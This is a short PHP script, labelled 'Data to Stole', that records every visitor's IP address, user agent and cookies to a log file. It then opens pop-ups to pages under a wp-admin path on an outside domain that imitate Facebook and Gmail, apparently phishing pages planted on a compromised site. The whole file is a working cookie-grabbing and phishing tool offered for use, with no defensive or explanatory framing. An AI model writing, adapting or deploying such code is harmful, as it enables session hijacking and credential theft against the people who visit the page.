<?php
/* ---[ Data to Stole ]--- */
date_default_timezone_set('Asia/Manila');
$time = date('M d Y - g:i a');
if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	$ip = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
	$ip = $_SERVER['REMOTE_ADDR']."\r\n";
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$cookies = $_SERVER['HTTP_COOKIE'];
/* END */

/* ---[ Saving Data ]--- */
$zCh = fopen("logs.txt", "a"); 
fwrite($zCh, "\n\n---[ " . $time . " ]---\n\n");
fwrite($zCh, "IP Address: " . $ip . "\n");
fwrite($zCh, "User Agent: " . $user_agent . "\n");
fwrite($zCh, "Cookie: " . $cookies . "\n");
fclose($zCh);
/* END */

echo '<script>
window.open("http://istanbulbahcepeyzaj.com/wp-admin/www.facebook.com/index.php");
window.open("http://istanbulbahcepeyzaj.com/wp-admin/www.gmail.com/index.php");
</script>';
?>
